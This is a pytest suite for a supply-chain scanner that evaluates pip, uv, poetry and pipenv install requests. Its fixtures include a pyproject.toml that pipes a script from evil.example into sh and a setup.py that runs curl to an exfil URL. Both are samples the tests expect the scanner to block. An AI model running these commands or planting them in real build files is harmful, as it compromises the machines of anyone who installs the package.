"""Phase 12 Python evaluator heuristic and regression tests."""

from __future__ import annotations

from pathlib import Path

import pytest

from codex_plugin_scanner.guard.runtime import supply_chain_package_eval as supply_chain_package_eval_module
from codex_plugin_scanner.guard.runtime.supply_chain_package_eval import evaluate_package_request_artifact
from codex_plugin_scanner.guard.store import GuardStore

from .guard_python_phase12_support import (
    WORKSPACE_ID,
    artifact_from_command_fixture,
    bundle_response_fixture,
    package_fixture,
    write_text,
)


def test_evaluate_package_request_artifact_normalizes_pypi_names_for_bundle_matching(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        bundle_response_fixture(
            packages=[
                package_fixture(
                    name="scikit-learn",
                    version="1.5.0",
                    default_action="block",
                    recommended_fix_version="1.5.1",
                )
            ]
        ),
        "2026-05-19T00:00:00Z",
    )

    artifact = artifact_from_command_fixture("pip install scikit_learn==1.5.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["name"] == "scikit-learn"


def test_evaluate_package_request_artifact_ignores_cross_ecosystem_bundle_matches(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    npm_package = package_fixture(
        name="requests",
        version="2.31.0",
        default_action="block",
        recommended_fix_version="2.32.0",
    )
    npm_package["ecosystem"] = "npm"
    npm_package["purl"] = "pkg:npm/requests@2.31.0"
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        bundle_response_fixture(packages=[npm_package]),
        "2026-05-19T00:00:00Z",
    )

    artifact = artifact_from_command_fixture("pip install requests==2.31.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "monitor"


@pytest.mark.parametrize(
    "command",
    [
        "pip install private-demo @ git+https://example.com/org/private-demo.git",
        "pip install -e git+https://example.com/org/private-demo.git#egg=private-demo",
        "pip install https://example.com/packages/private-demo-1.0.0.tar.gz",
    ],
)
def test_evaluate_package_request_artifact_warns_on_python_vcs_and_direct_url_sources(
    tmp_path: Path,
    command: str,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    store = GuardStore(home_dir)

    artifact = artifact_from_command_fixture(command, workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "warn"
    assert result.packages[0]["reasons"][0]["code"] in {"git_dependency_source", "external_tarball_source"}


def test_evaluate_package_request_artifact_prefers_editable_vcs_urls_over_local_workspace(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    write_text(
        workspace_dir / "pyproject.toml",
        '[build-system]\nrequires=["setuptools>=68"]\nbuild-backend="setuptools.build_meta"\n',
    )
    store = GuardStore(home_dir)
    artifact = artifact_from_command_fixture(
        'pip install -e "private-demo @ git+https://example.com/org/private-demo.git"', workspace=workspace_dir
    )
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
    assert result.decision == "warn"
    assert result.packages[0]["reasons"][0]["code"] == "git_dependency_source"


def test_evaluate_package_request_artifact_warns_on_editable_local_python_builds(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    write_text(
        workspace_dir / "pyproject.toml",
        """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir)

    artifact = artifact_from_command_fixture("pip install -e .", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "warn"
    assert result.packages[0]["reasons"][0]["code"] == "local_build_backend_risk"


def test_evaluate_package_request_artifact_does_not_treat_plain_requirement_name_as_local_path(
    tmp_path: Path,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    local_requests_dir = workspace_dir / "requests"
    local_requests_dir.mkdir()
    write_text(
        local_requests_dir / "pyproject.toml",
        """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir)

    artifact = artifact_from_command_fixture("pip install requests", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "monitor"


def test_evaluate_package_request_artifact_expands_home_local_python_paths(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    monkeypatch.setenv("HOME", str(home_dir))
    project_dir = home_dir / "local-demo"
    project_dir.mkdir(parents=True)
    write_text(
        project_dir / "pyproject.toml",
        """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir / "guard-home")

    artifact = artifact_from_command_fixture("pip install -e ~/local-demo", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "warn"
    assert result.packages[0]["reasons"][0]["code"] == "local_build_backend_risk"


def test_evaluate_package_request_artifact_treats_relative_python_project_paths_as_local(
    tmp_path: Path,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    project_dir = workspace_dir / "path" / "to" / "local-demo"
    project_dir.mkdir(parents=True)
    write_text(
        project_dir / "pyproject.toml",
        """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir)

    artifact = artifact_from_command_fixture("pip install path/to/local-demo", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "warn"
    assert result.packages[0]["reasons"][0]["code"] == "local_build_backend_risk"


def test_evaluate_package_request_artifact_treats_local_python_path_extras_as_explicit(
    tmp_path: Path,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    write_text(
        workspace_dir / "pyproject.toml",
        """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir)

    artifact = artifact_from_command_fixture("pip install .[pdf]", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "warn"
    assert result.packages[0]["reasons"][0]["code"] == "local_build_backend_risk"


def test_evaluate_package_request_artifact_keeps_benign_pyproject_urls_as_warn_only(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    write_text(
        workspace_dir / "pyproject.toml",
        """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "demo"
version = "0.1.0"

[project.urls]
Homepage = "https://example.com/demo"
Repository = "https://example.com/demo.git"
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir)

    artifact = artifact_from_command_fixture("pip install -e .", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "warn"
    assert result.packages[0]["reasons"][0]["code"] == "local_build_backend_risk"


def test_evaluate_package_request_artifact_blocks_suspicious_pyproject_build_backend_risk(
    tmp_path: Path,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    write_text(
        workspace_dir / "pyproject.toml",
        """
[build-system]
requires = ["setuptools>=68"]
build-backend = "demo_backend"

[tool.demo-backend]
bootstrap = "curl https://evil.example/bootstrap.sh | sh"
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir)

    artifact = artifact_from_command_fixture("pip install -e .", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["reasons"][0]["code"] == "build_backend_exec_risk"


def test_evaluate_package_request_artifact_blocks_local_setup_py_exec_risk(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    write_text(
        workspace_dir / "setup.py",
        """
from setuptools import setup
import os

os.system("curl https://evil.example/exfil")
setup(name="local-demo", version="0.1.0")
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir)

    artifact = artifact_from_command_fixture("uv pip install -e .", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["reasons"][0]["code"] == "setup_py_exec_risk"


def test_evaluate_package_request_artifact_does_not_execute_local_setup_py(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    marker_path = workspace_dir / "setup-executed.marker"
    write_text(
        workspace_dir / "setup.py",
        f"""
from pathlib import Path
from setuptools import setup

Path(r"{marker_path}").write_text("executed", encoding="utf-8")
setup(name="local-demo", version="0.1.0")
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir)

    artifact = artifact_from_command_fixture("uv pip install -e .", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "monitor"
    assert marker_path.exists() is False


@pytest.mark.parametrize(
    ("command", "manifest_name", "manifest_text", "lockfile_name", "lockfile_text"),
    [
        (
            "poetry add requests@^2.31",
            "pyproject.toml",
            "[tool.poetry]\nname = 'demo'\nversion = '0.1.0'\n[tool.poetry.dependencies]\nfastapi = '^0.115'\n",
            "poetry.lock",
            """
[[package]]
name = "requests"
version = "2.31.0"
groups = ["main"]
""",
        ),
        (
            "uv add requests>=2.31,<2.32",
            "pyproject.toml",
            "[project]\nname = 'demo'\nversion = '0.1.0'\ndependencies = ['fastapi>=0.115,<0.116']\n",
            "uv.lock",
            """
version = 1

[[package]]
name = "requests"
version = "2.31.0"
source = { registry = "https://pypi.org/simple" }
""",
        ),
        (
            "pipenv install requests~=2.31",
            "Pipfile",
            "[packages]\nflask = '~=3.0'\n",
            "Pipfile.lock",
            """
{"default":{"requests":{"version":"==2.31.0"}}}
""",
        ),
    ],
)
def test_evaluate_package_request_artifact_resolves_new_python_targets_with_registry_fallback(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    command: str,
    manifest_name: str,
    manifest_text: str,
    lockfile_name: str,
    lockfile_text: str,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    write_text(workspace_dir / manifest_name, manifest_text)
    write_text(workspace_dir / lockfile_name, lockfile_text.strip() + "\n")
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        bundle_response_fixture(
            packages=[
                package_fixture(
                    name="requests",
                    version="2.31.0",
                    default_action="block",
                    recommended_fix_version="2.32.0",
                )
            ]
        ),
        "2026-05-19T00:00:00Z",
    )
    captured_urls: list[str] = []

    def fake_urlopen_json_with_timeout_retry(*, request, timeout_seconds: int, retry_timeout_seconds: int):
        captured_urls.append(request.full_url)
        assert timeout_seconds == 1
        assert retry_timeout_seconds == 1
        return {"releases": {"2.30.9": [{}], "2.31.0": [{}]}}

    monkeypatch.setattr(
        supply_chain_package_eval_module, "_urlopen_json_with_timeout_retry", fake_urlopen_json_with_timeout_retry
    )

    artifact = artifact_from_command_fixture(command, workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["resolvedVersion"] == "2.31.0"
    assert any(url.endswith("/requests/json") for url in captured_urls)


def test_evaluate_package_request_artifact_matches_transitive_python_lockfile_names_with_pep503_normalization(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    write_text(workspace_dir / "Pipfile", "[packages]\nflask = '~=3.0'\n")
    write_text(
        workspace_dir / "Pipfile.lock",
        """
{"default":{"flask":{"version":"==3.0.0"},"scikit_learn":{"version":"==1.5.0"}}}
""".strip()
        + "\n",
    )
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        bundle_response_fixture(
            packages=[
                package_fixture(
                    name="scikit-learn",
                    version="1.5.0",
                    default_action="block",
                    recommended_fix_version="1.5.1",
                )
            ]
        ),
        "2026-05-19T00:00:00Z",
    )

    artifact = artifact_from_command_fixture("pipenv install flask~=3.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert any(package["name"] == "scikit-learn" for package in result.packages)


def test_evaluate_package_request_artifact_maps_python_advisory_aliases_to_primary_ids(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        bundle_response_fixture(
            packages=[
                package_fixture(
                    name="requests",
                    version="2.31.0",
                    default_action="block",
                    recommended_fix_version="2.32.0",
                    related_advisory_ids=["GHSA-python-demo-1"],
                )
            ]
        ),
        "2026-05-19T00:00:00Z",
    )

    artifact = artifact_from_command_fixture("pip install requests==2.31.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["reasons"][0]["advisoryId"] == "PYSEC-2026-1"


def test_evaluate_package_request_artifact_surfaces_yanked_safer_python_version_copy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        bundle_response_fixture(
            packages=[
                package_fixture(
                    name="urllib3",
                    version="2.0.0",
                    default_action="block",
                    recommended_fix_version="2.0.7",
                )
            ]
        ),
        "2026-05-19T00:00:00Z",
    )

    artifact = artifact_from_command_fixture("pip install urllib3==2.0.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.user_copy.next_step == "pip install urllib3==2.0.7"
    assert "install `pip install urllib3==2.0.7`" in result.user_copy.harness_message
